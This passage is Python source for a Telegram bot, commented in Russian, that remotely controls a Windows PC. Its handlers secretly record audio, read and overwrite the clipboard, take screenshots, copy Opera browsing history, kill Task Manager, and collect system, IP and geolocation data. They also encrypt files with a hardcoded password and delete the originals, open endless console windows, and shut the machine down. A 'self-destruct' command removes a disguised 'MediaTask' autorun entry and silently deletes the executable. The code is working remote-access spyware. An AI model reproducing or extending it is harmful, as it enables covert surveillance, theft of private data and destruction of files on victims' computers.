        await message.answer("К сожалению, у вас нет доступа к этому боту.")
# Функция для записи аудио
async def start_audio_recording(message: types.Message, state: FSMContext, recording_time: int):
    if message.from_user.id == ALLOWED_USER_ID:
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        CHUNK = 1024
        OUTPUT_FILENAME = "output.wav"
        save_audio = os.path.join(directory, OUTPUT_FILENAME)

        audio = pyaudio.PyAudio()
        stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)

        await message.answer("Начало записи...")

        frames = []
        for i in range(0, int(RATE / CHUNK * recording_time)):
            data = stream.read(CHUNK)
            frames.append(data)

        await message.answer("Запись завершена.")

        stream.stop_stream()
        stream.close()
        audio.terminate()

        wf = wave.open(save_audio, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(audio.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()

        try:
            file_to_send = FSInputFile(save_audio)
            await message.answer_document(document=file_to_send, caption="Вот запись аудио!")
            os.remove(save_audio)
            await state.clear()
        except Exception as e:
            await message.answer(f"Ошибка при отправке файла: {e}")
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")
# Хэндлер на кнопку "запись аудио"
@dp.message(F.text.lower() == "посмотреть буфер обмена")
async def conten(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:
        clipboard_content = pyperclip.paste()

        await message.answer(f"Содержимое буфера обмена:\n{clipboard_content}")

    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

class clipboard(StatesGroup):
    waiting_for_newClipboard = State()
@dp.message(F.text.lower() == "изменить буфер обмена")
async def new_Clipboard(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        await message.answer("Хорошо, отправь мне текст на который хочешь заменить буфер обмена")
        await state.set_state(clipboard.waiting_for_newClipboard)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(clipboard.waiting_for_newClipboard)
async def new_Clipboard_wait(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        new_text = message.text

        # Помещаем текст в буфер обмена
        pyperclip.copy(new_text)

        await message.answer("Текст успешно помещен в буфер обмена!")
        await state.clear()
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

class url(StatesGroup):
    waiting_url = State()
# Хэндлер на кнопку "запись аудио"
@dp.message(F.text.lower() == "открыть ссылку")
async def open_url(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:

        await message.answer("Ок, кидай ссылку.")
        await state.set_state(url.waiting_url)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(url.waiting_url)
async def open_url(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:

        url = message.text
        webbrowser.open(url)


        # Задержка в 5 секунд
        await asyncio.sleep(1)
        await message.answer("Ссылка была успешно открыта:")
        # Делаем скриншот всего экрана
        screenshot = pyautogui.screenshot()
        filename = "screenshot.png"
        filepath = os.path.join(directory, filename)

        # Убедитесь, что директория существует, если нет, создайте её
        os.makedirs(directory, exist_ok=True)

        # Сохраняем скриншот в указанную директорию
        screenshot.save(filepath)

        # Создаем объект FSInputFile
        photo = FSInputFile(filepath)

        # Отправляем фото с подписью
        await message.answer_photo(photo)

        # Удаляем файл после отправки
        if os.path.exists(filepath):
            os.remove(filepath)

        async def main():
            await dp.start_polling(bot)
        await state.clear()
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

# Хэндлер на кнопку "запись аудио"
@dp.message(F.text.lower() == "закрыть диспетчер задач")
async def open_url(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:

            # Проходим по всем процессам и ищем "Taskmgr.exe"
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] == 'Taskmgr.exe':
                    # Завершаем процесс диспетчера задач
                psutil.Process(proc.info['pid']).terminate()
                await message.answer("Task Manager закрыт.")
                break
        else:
            await message.answer("Диспетчер задач не запущен.")

    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(F.text.lower() == "история оперы")
async def cmd_start(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:
        def get_opera_history():
            # Путь к файлу истории Opera (для Windows)
            history_path = os.path.expandvars(r'%APPDATA%\Opera Software\Opera Stable\History')

            # Проверка, существует ли файл истории
            if not os.path.exists(history_path):
                return False, "Файл истории Opera не найден. Возможно, браузер Opera не установлен."

            # Создаем временную копию файла, так как файл может быть заблокирован для чтения
            temp_history_path = 'temp_opera_history'
            shutil.copy2(history_path, temp_history_path)

            # Подключаемся к базе данных SQLite
            conn = sqlite3.connect(temp_history_path)
            cursor = conn.cursor()

            # Запрос для извлечения истории посещенных страниц
            query = """
            SELECT urls.url, urls.title, urls.last_visit_time
            FROM urls
            ORDER BY last_visit_time DESC
            """
            cursor.execute(query)

            rows = cursor.fetchall()

            # Переменная для накопления текста
            text_to_save = ""

            # Форматируем вывод
            for row in rows:
                url = row[0]
                title = row[1]
                last_visit_time = row[2]

                # Преобразуем время последнего посещения
                try:
                    if last_visit_time > 0:
                        # Преобразуем время в формат Unix timestamp
                        last_visit_time = last_visit_time / 1000000 - 11644473600
                        last_visit_time = datetime.datetime.fromtimestamp(last_visit_time).strftime('%Y-%m-%d %H:%M:%S')
                    else:
                        last_visit_time = 'Invalid time'
                except (OSError, ValueError) as e:
                    last_visit_time = f'Error: {str(e)}'

                # Накопление текста
                text_to_save += f"URL: {url}\nTitle: {title}\nLast Visit: {last_visit_time}\n\n"

            # Полный путь к файлу
            file_path = os.path.join(directory, 'История_Оперы.txt')

            # Сохранение накопленного текста в файл
            with open(file_path, 'w', encoding='utf-8') as file:
                file.write(text_to_save)

            # Закрываем соединение
            conn.close()

            # Удаляем временный файл
            os.remove(temp_history_path)

            return True, file_path

        await message.answer("Получение истории Opera. Пожалуйста, подождите...")
        success, result = get_opera_history()

        if not success:
            await message.answer(result)
            return

        file_path = result
        try:
            # Загружаем файл для отправки
            file_to_send = FSInputFile(file_path)

            # Отправляем файл пользователю
            await message.answer_document(document=file_to_send, caption="Вот ваш файл!")

        except Exception as e:
            await message.answer(f"Ошибка при отправке файла: {e}")
        os.remove(file_path)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(F.text.lower() == "выключить звук")
async def open_url(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        # Отключение звука на Windows

        def mute_sound():
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            volume.SetMute(1, None)  # 1 - отключить звук, 0 - включить

        mute_sound()
        await message.answer("Звук отключен.")
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(F.text.lower() == "включить звук")
async def open_url(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        # Отключение звука на Windows

        def mute_sound():
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            volume.SetMute(0, None)  # 1 - отключить звук, 0 - включить

        mute_sound()
        await message.answer("Звук включен.")
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(F.text.lower() == "звук на 100%")
async def open_url(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        # Отключение звука на Windows

        def set_volume_to_100():
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))

            # Установка громкости на 100% (1.0 означает 100%)
            volume.SetMasterVolumeLevelScalar(1.0, None)

        set_volume_to_100()
        await message.answer("Громкость была установлена на 100%✅")
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class Encrypt(StatesGroup):
    waiting_d = State()

@dp.message(F.text.lower() == "зашифровать файл")
async def start_encryption(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        await message.answer("Укажите путь и расширение файла, пример:\n C:/Users/Public/Название_файла.txt")
        await state.set_state(Encrypt.waiting_d)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(Encrypt.waiting_d)
async def process_file_path(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        file_path = message.text

        try:
            # Проверяем, существует ли файл
            if os.path.exists(file_path):
                # Функция для генерации ключа на основе пароля
                def generate_key(password: str, salt: bytes) -> bytes:
                    kdf = Scrypt(
                        salt=salt,
                        length=32,
                        n=2 ** 14,
                        r=8,
                        p=1,
                        backend=default_backend()
                    )
                    return kdf.derive(password.encode())

                # Функция шифрования данных
                def encrypt_file(file_path: str, password: str):
                    try:
                        salt = os.urandom(16)
                        key = generate_key(password, salt)

                        iv = os.urandom(16)
                        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
                        encryptor = cipher.encryptor()

                        with open(file_path, 'rb') as f:
                            file_data = f.read()

                        # Добавление padding, так как AES работает с блоками данных
                        padder = padding.PKCS7(128).padder()
                        padded_data = padder.update(file_data) + padder.finalize()

                        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

                        # Запись зашифрованных данных в новый файл
                        with open(file_path + '.enc', 'wb') as f:
                            f.write(salt + iv + encrypted_data)

                    except Exception as e:
                        logger.error(f"Ошибка при шифровании файла {file_path}: {e}")
                        return False
                    return True

                password = 'kjesbfskjfbalga;ewgb/gebiwekwfnwgwawgeogk4egikaleikdrinlomgs;oegm'  # Пароль для шифрования
                success = encrypt_file(file_path, password)

                if success:
                    try:
                        # Удаляем исходный файл после шифрования
                        os.remove(file_path)
                    except Exception as e:
                        logger.error(f"Ошибка при удалении файла {file_path}: {e}")
                        await message.answer(f'Файл {file_path} успешно зашифрован, но произошла ошибка при удалении исходного файла.')

                    await message.answer(f'Файл {file_path} успешно зашифрован и сохранён как {file_path}.enc')
                else:
                    await message.answer(f'Произошла ошибка при шифровании файла {file_path}. Процесс прекращён.')
            else:
                await message.answer(f"Файл {file_path} не был найден. \nПожалуйста, проверьте правильность пути и имени файла, затем повторите попытку.")

        except Exception as e:
            logger.error(f"Ошибка при обработке пути файла {file_path}: {e}")
            await message.answer("Произошла ошибка. Попробуйте снова.")
        finally:
            # Завершаем состояние с помощью метода clear
            await state.clear()
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

class Decipher(StatesGroup):
    waiting_d_enc = State()

@dp.message(F.text.lower() == "расшифровать файл")
async def start_decipher(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        await message.answer("Укажите путь и расширение файла и в конце укажите '.enc', пример:\n C:/Users/Public/Название_файла.txt.enc")
        await state.set_state(Decipher.waiting_d_enc)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(Decipher.waiting_d_enc)
async def process_file_path(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        encrypted_file_path = message.text

        try:
            # Проверяем, существует ли файл
            if os.path.exists(encrypted_file_path):
                # Функция для генерации ключа на основе пароля (та же, что и при шифровании)
                def generate_key(password: str, salt: bytes) -> bytes:
                    kdf = Scrypt(
                        salt=salt,
                        length=32,
                        n=2 ** 14,
                        r=8,
                        p=1,
                        backend=default_backend()
                    )
                    return kdf.derive(password.encode())

                # Функция расшифровки данных
                def decrypt_file(encrypted_file_path: str, password: str):
                    try:
                        with open(encrypted_file_path, 'rb') as f:
                            # Считываем соль, IV и зашифрованные данные
                            salt = f.read(16)  # Первые 16 байт - это соль
                            iv = f.read(16)  # Следующие 16 байт - это IV
                            encrypted_data = f.read()  # Остальные данные - зашифрованные

                        key = generate_key(password, salt)

                        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
                        decryptor = cipher.decryptor()

                        decrypted_padded_data = decryptor.update(encrypted_data) + decryptor.finalize()

                        # Убираем padding
                        unpadder = padding.PKCS7(128).unpadder()
                        decrypted_data = unpadder.update(decrypted_padded_data) + unpadder.finalize()

                        # Сохраняем расшифрованные данные в новый файл
                        decrypted_file_path = encrypted_file_path.replace('.enc', '.txt')
                        with open(decrypted_file_path, 'wb') as f:
                            f.write(decrypted_data)

                        return decrypted_file_path

                    except Exception as e:
                        logger.error(f"Ошибка при расшифровке файла {encrypted_file_path}: {e}")
                        return None

                password = 'kjesbfskjfbalga;ewgb/gebiwekwfnwgwawgeogk4egikaleikdrinlomgs;oegm'  # Тот же пароль, который использовался для шифрования
                decrypted_file_path = decrypt_file(encrypted_file_path, password)
                new_file_path = os.path.splitext(decrypted_file_path)[0]
                if decrypted_file_path and os.path.exists(decrypted_file_path):
                    await message.answer(f'Файл {encrypted_file_path} успешно расшифрован как {new_file_path}')


                    try:
                        # Удаляем зашифрованный файл после расшифрования
                        os.remove(encrypted_file_path)
                        # Путь к файлу


                        # Получение имени файла без расширения


                        try:
                            # Переименование файла
                            os.rename(decrypted_file_path, new_file_path)

                        except FileNotFoundError:
                            await message.answer(f"Файл {decrypted_file_path} не найден")
                        except PermissionError:
                            await message.answer(f"Нет прав на изменение имени файла {decrypted_file_path}")
                        except Exception as e:
                            await message.answer(f"Произошла ошибка: {e}")

                    except Exception as e:
                        logger.error(f"Ошибка при удалении файла {encrypted_file_path}: {e}")

                elif decrypted_file_path is None:
                    await message.answer(f'Произошла ошибка при расшифровке файла {encrypted_file_path}. Процесс прекращён.')
            else:
                await message.answer(f"Файл {encrypted_file_path} не был найден. \nПожалуйста, проверьте правильность пути и имени файла, затем повторите попытку.")
        except Exception as e:
            logger.error(f"Ошибка при обработке пути файла {encrypted_file_path}: {e}")
            await message.answer("Произошла ошибка. Попробуйте снова.")
        finally:
            # Завершаем состояние с помощью метода clear
            await state.clear()
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

class CMDBOOM(StatesGroup):
    waiting_CMD = State()

@dp.message(F.text.lower() == "cmd бомба")
async def start_decipher(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        await message.answer("Осторожно ❗️\nЕсли запустить эту команду бесконечно, поможет только перезагрузка ПК.\nВведи сколько раз хочешь открыть консоль: \nЕсли хочешь бесконечно, то введи 404")
        await state.set_state(CMDBOOM.waiting_CMD)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(CMDBOOM.waiting_CMD)
async def process_file_path(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        try:
            BOOM = int(message.text)

            if BOOM < 0:
                await message.answer("Количество должно быть неотрицательным. Пожалуйста, попробуйте снова.")
                return



            elif BOOM == 404:
                # Бесконечный запуск командных строк
                while True:
                    subprocess.Popen('start cmd', shell=True)

            else:
                # Запускаем BOOM раз
                for _ in range(BOOM):
                    subprocess.Popen('start cmd', shell=True)
                await state.clear()

            await message.answer("Консоли открыты.")

        except ValueError:
            await message.answer("Пожалуйста, введите корректное число.")
        except Exception as e:
            await message.answer(f"Произошла ошибка: {str(e)}")
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")


@dp.message(lambda message: message.text and message.text.lower() == "данные пк")
async def handle_message(message: types.Message):
    if message.from_user.id != ALLOWED_USER_ID:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")
        return

    await message.answer("Начинаем сбор данных о ПК. Это может занять некоторое время.")

    try:
        # 1. Получаем информацию о процессоре
        await message.answer("Собираем данные о процессоре...")

        # Используем psutil для получения информации о процессоре без частоты
        try:
            cpu_info = {
                'brand_raw': 'Неизвестно',
                'arch': platform.architecture()[0],
                'cores': psutil.cpu_count(logical=False),
                'logical_cores': psutil.cpu_count(logical=True)
            }
        except Exception as e:
            await message.answer(f"Ошибка при сборе данных о процессоре: {e}")
            return

        await message.answer("Информация о процессоре получена.")

        # 2. Получаем информацию о видеокарте
        await message.answer("Собираем информацию о видеокарте...")

        try:
            gpus = GPUtil.getGPUs()
            if gpus:
                gpu_info = f"Модель: {gpus[0].name}, Память: {gpus[0].memoryTotal} GB"
            else:
                gpu_info = "Видеокарта не обнаружена"
        except Exception as e:
            gpu_info = f"Ошибка при сборе данных о видеокарте: {e}"

        await message.answer("Информация о видеокарте собрана.")

        # 3. Получаем системную информацию
        await message.answer("Собираем системную информацию...")
        system_info = platform.uname()
        user_name = getpass.getuser()
        await message.answer("Системная информация собрана.")

        # 4. Асинхронно получаем публичный IP и данные о сети
        await message.answer("Собираем данные о сети (IP-адрес и геолокация)...")

        async def fetch_public_ip():
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get('https://api.ipify.org?format=json', timeout=5) as response:
                        data = await response.json()
                        return data['ip']
            except asyncio.TimeoutError:
                return "Превышено время ожидания для IP-адреса"
            except Exception as e:
                return f"Ошибка при получении IP: {e}"

        async def fetch_ip_info():
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get("http://ip-api.com/json/", timeout=5) as response:
                        return await response.json()
            except asyncio.TimeoutError:
                return {"error": "Превышено время ожидания для IP-информации"}
            except Exception as e:
                return {"error": str(e)}

        # Параллельный сбор IP-данных
        public_ip, ip_info = await asyncio.gather(fetch_public_ip(), fetch_ip_info())
        await message.answer("Данные о сети собраны.")

        # 5. Получаем локальный IP и имя хоста
        await message.answer("Получаем локальный IP и имя компьютера...")
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        await message.answer("Локальный IP и имя компьютера получены.")

        # Формируем отчет
        report = f"""
        Архитектура процессора: {cpu_info['arch']}
        Количество ядер процессора: {cpu_info['cores']}
        Логическое количество ядер: {cpu_info['logical_cores']}
        Видеокарта: {gpu_info}
        Общая память ОЗУ: {psutil.virtual_memory().total / (1024 ** 3):.2f} GB
        Система: {system_info.system} {system_info.release}
        Имя пользователя: {user_name}
        Имя ПК: {hostname}
        Публичный IP-адрес: {public_ip}
        Локальный IP-адрес: {local_ip}
        Данные локации и IP: {ip_info}
        """
        # 6. Отправляем промежуточный отчет
        await message.answer("Формируем и отправляем отчет...")
        await message.answer(report)

    except Exception as e:
        await message.answer(f"Произошла ошибка при сборе данных: {e}")


@dp.message(lambda message: message.text and message.text.lower() == "диагностика сети")
async def handle_network_diagnostics(message: types.Message):
    if message.from_user.id == ALLOWED_USER_ID:
        await message.answer("Собираем данные это может занять некоторое время.")
        async def ping(host):
            try:
                result = subprocess.run(["ping", "-c", "4", host], capture_output=True, text=True)
                return result.stdout
            except Exception as e:
                return f"Ошибка пинга: {e}"

        async def traceroute(host):
            try:
                result = subprocess.run(["traceroute", host], capture_output=True, text=True)
                return result.stdout
            except Exception as e:
                return f"Ошибка трассировки: {e}"

        async def scan_ports(host, ports):
            open_ports = []
            for port in ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((host, port))
                    if result == 0:
                        open_ports.append(port)
                    sock.close()
                except Exception as e:
                    return f"Ошибка сканирования портов: {e}"
            return open_ports

        async def get_network_info():
            try:
                info = {}
                for iface, addrs in psutil.net_if_addrs().items():
                    info[iface] = {addr.family.name: addr.address for addr in addrs}
                return info
            except Exception as e:
                return f"Ошибка получения информации о сети: {e}"

        async def resolve_dns(host):
            try:
                ip = socket.gethostbyname(host)
                return f"IP-адрес для {host}: {ip}"
            except Exception as e:
                return f"Ошибка разрешения DNS: {e}"

        async def check_website(url):
            try:
                response = requests.get(url)
                return f"Статус сайта {url}: {response.status_code} ({response.reason})"
            except Exception as e:
                return f"Ошибка доступа к сайту: {e}"

        async def get_external_ip():
            try:
                response = requests.get('https://api.ipify.org?format=json')
                return f"Внешний IP-адрес: {response.json().get('ip')}"
            except Exception as e:
                return f"Ошибка получения внешнего IP: {e}"

        async def network_traffic():
            try:
                net_info = psutil.net_io_counters()
                return (f"Принято данных: {net_info.bytes_recv / 1_000_000:.2f} МБ\n"
                        f"Отправлено данных: {net_info.bytes_sent / 1_000_000:.2f} МБ")
            except Exception as e:
                return f"Ошибка получения информации о трафике: {e}"

        async def get_mtu(interface):
            try:
                mtu = psutil.net_if_stats()[interface].mtu
                return f"MTU для интерфейса {interface}: {mtu}"
            except Exception as e:
                return f"Ошибка получения MTU: {e}"

        async def generate_report():
            report = []
            report.append("Отчет о сети\n")

            try:
                # Пинг
                report.append("Результаты пинга:\n")
                report.append(await ping("google.com") + "\n")

                # Трассировка маршрута
                report.append("Результаты трассировки маршрута:\n")
                report.append(await traceroute("google.com") + "\n")

                # Сканирование портов
                report.append("Результаты сканирования портов:\n")
                open_ports = await scan_ports("localhost", [22, 80, 443, 8080])
                report.append(f"Открытые порты: {open_ports}\n")

                # Информация о сети
                report.append("Информация о сети:\n")
                network_info = await get_network_info()
                if isinstance(network_info, dict):
                    for iface, addresses in network_info.items():
                        report.append(f"{iface}: {addresses}\n")
                else:
                    report.append(network_info + "\n")

                # Дополнительная информация
                report.append("Дополнительная информация:\n")
                report.append(await resolve_dns("google.com") + "\n")
                report.append(await check_website("https://google.com") + "\n")
                report.append(await get_external_ip() + "\n")
                report.append(await network_traffic() + "\n")
                for iface in psutil.net_if_stats():
                    report.append(await get_mtu(iface) + "\n")

            except Exception as e:
                report.append(f"Ошибка при создании отчета: {e}\n")

            # Вывод отчета
            await message.answer("".join(report))

        await generate_report()
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(lambda message: message.text and message.text.lower() == "выключить пк")
async def start_decipher(message):
    if message.from_user.id == ALLOWED_USER_ID:
        await message.answer("ОК, выключаю ПК.")
        os.system('shutdown /s /t 1')
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")


@dp.message(lambda message: message.text and message.text.lower() == "перезагрузить пк")
async def start_decipher(message):
    if message.from_user.id == ALLOWED_USER_ID:
        await message.answer("ОК,перезагружаю ПК.")
        os.system('shutdown /r /t 1')
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

class fdesk(StatesGroup):
    waiting_photo = State()

# Обработчик команды "поменять обои"
@dp.message(F.text.lower() == "поменять обои")
async def wallpaper(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        await message.answer("Хорошо, отправьте фото.")
        await state.set_state(fdesk.waiting_photo)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

# Обработчик получения фото или документа
@dp.message(fdesk.waiting_photo, F.content_type.in_([ContentType.PHOTO, ContentType.DOCUMENT]))
async def receiving_photo(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        try:
            if message.content_type == ContentType.PHOTO:
                # Обработка фото
                photo = message.photo[-1]  # Выбираем фото с наибольшим разрешением
                file_id = photo.file_id
                file_name = f"{file_id}.jpg"  # Можете указать другое расширение или имя файла
            elif message.content_type == ContentType.DOCUMENT:
                # Обработка документа
                document = message.document
                file_id = document.file_id
                file_name = document.file_name

            # Получаем информацию о файле
            file_info = await bot.get_file(file_id)
            file_path = file_info.file_path

            # Скачиваем файл
            file = await bot.download_file(file_path)

            # Путь для сохранения
            save_path = os.path.join(directory, file_name)

            # Сохраняем файл на диск
            with open(save_path, 'wb') as f:
                f.write(file.getvalue())

            def set_wallpaper(image_path):
                # Получаем полный путь к изображению
                full_path = os.path.abspath(image_path)

                # Задаем флаг для обновления обоев
                SPI_SETDESKWALLPAPER = 20
                ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, full_path, 3)

            # Указываем путь к картинке
            set_wallpaper(save_path)
            await message.reply(f"Обои успешно заменены.")
            os.remove(save_path)

        except FileNotFoundError:
            await message.reply("Ошибка: файл не найден.")
        except Exception as e:
            await message.reply(f"Произошла ошибка: {e}")
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

class move_file(StatesGroup):
    waiting_path1 = State()
    waiting_path2 = State()

@dp.message(F.text.lower() == "перемистить файл")
async def start_move_file(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        await message.answer(
            "Хорошо, введите путь файла, который хотите переместить (например, C:/Users/Public/Название_файла.txt):")
        await state.set_state(move_file.waiting_path1)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")

@dp.message(move_file.waiting_path1)
async def get_source_path(message: types.Message, state: FSMContext):
    source_path = message.text

    # Проверка, существует ли исходный файл
    if not os.path.isfile(source_path):
        await message.answer("Файл не найден. Пожалуйста, убедитесь, что путь к файлу указан правильно и перезапустите процесс.")
        await state.clear()
        return  # Прерываем дальнейшее выполнение

    await state.update_data(source_path=source_path)
    await message.answer("Теперь введите путь, куда нужно переместить файл (например, C:/Users/Public/Целевая_папка/):")
    await state.set_state(move_file.waiting_path2)

@dp.message(move_file.waiting_path2)
async def get_destination_path(message: types.Message, state: FSMContext):
    destination_path = message.text
    data = await state.get_data()
    source_path = data.get("source_path")

    # Проверка, существует ли директория назначения
    if not os.path.isdir(destination_path):
        await message.answer("Целевая директория не найдена. Пожалуйста, убедитесь, что путь к директории указан правильно и перезапустите процесс.")
        await state.clear()
        return  # Прерываем дальнейшее выполнение

    try:
        # Попытка перемещения файла
        shutil.move(source_path, destination_path)
        await message.answer(f"Файл успешно перемещён в {destination_path}.")
    except FileNotFoundError:
        await message.answer("Файл или директория не найдены. Проверьте путь.")
    except PermissionError:
        await message.answer("Недостаточно прав для перемещения файла. Пожалуйста, проверьте права доступа.")
    except OSError as e:
        await message.answer(f"Ошибка доступа к файлу или директории: {e}")
    except Exception as e:
        await message.answer(f"Произошла непредвиденная ошибка: {e}")
    finally:
        await state.clear()



class self_destruction(StatesGroup):
    waiting_code = State()
@dp.message(F.text.lower() == "самоуничтожение")
async def start_move_file(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        await message.answer(
            "Вы уверены что хотите это сделать? \nДля подтверждения отправтее эту комбинацию:'14035218'")
        await state.set_state(self_destruction.waiting_code)
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")
@dp.message(self_destruction.waiting_code)
async def get_destination_path(message: types.Message, state: FSMContext):
    if message.from_user.id == ALLOWED_USER_ID:
        code = message.text

        if code == '14035218':
            await message.answer("Было приятно с вами поработать, Сэр. Выполняю протокол 'самоуничтожение'.")

            def remove_from_autorun(program_name):
                # Путь к папке автозагрузки для текущего пользователя
                startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs',
                                              'Startup')

                # Полный путь к возможному файлу автозагрузки
                program_path = os.path.join(startup_folder,
                                            program_name + '.lnk')  # Обычно файлы автозагрузки имеют расширение .lnk

                try:
                    # Открываем ключ автозагрузки в реестре
                    reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                                             0, winreg.KEY_SET_VALUE)

                    # Попробуем удалить запись с именем программы
                    try:
                        winreg.DeleteValue(reg_key, program_name)
                    except FileNotFoundError:
                        pass

                    # Закрываем ключ
                    winreg.CloseKey(reg_key)

                    # Проверяем и удаляем файл из папки автозагрузки
                    if os.path.isfile(program_path):
                        os.remove(program_path)

                except Exception:
                    pass
            if __name__ == "__main__":
                # Укажите имя программы, которую нужно удалить из автозагрузки
                program_name = "MediaTask"  # Укажите имя программы без расширения
                remove_from_autorun(program_name)



            def self_destruct():
                # Получаем путь к исполняемому файлу
                exe_path = sys.executable

                # Команда для удаления файла через командную строку
                delete_command = f'del "{exe_path}"'

                # Запускаем команду в скрытом режиме, без открытия консоли
                subprocess.Popen(f'ping localhost -n 6 > nul && {delete_command}',
                                 shell=True,
                                 creationflags=subprocess.CREATE_NO_WINDOW)

            if __name__ == "__main__":

                time.sleep(1)  # Имитация выполнения программы
                self_destruct()
                sys.exit()  # Завершаем работу программы
        else:
            await message.answer("Комбинация была введена неверно. Продолжаю работать дальше с вами, Сэр.")
            await state.clear()
    else:
        await message.answer("К сожалению, у вас нет доступа к этому боту.")



async def main():
    await dp.start_polling(bot)
if __name__ == "__main__":
    asyncio.run(main())
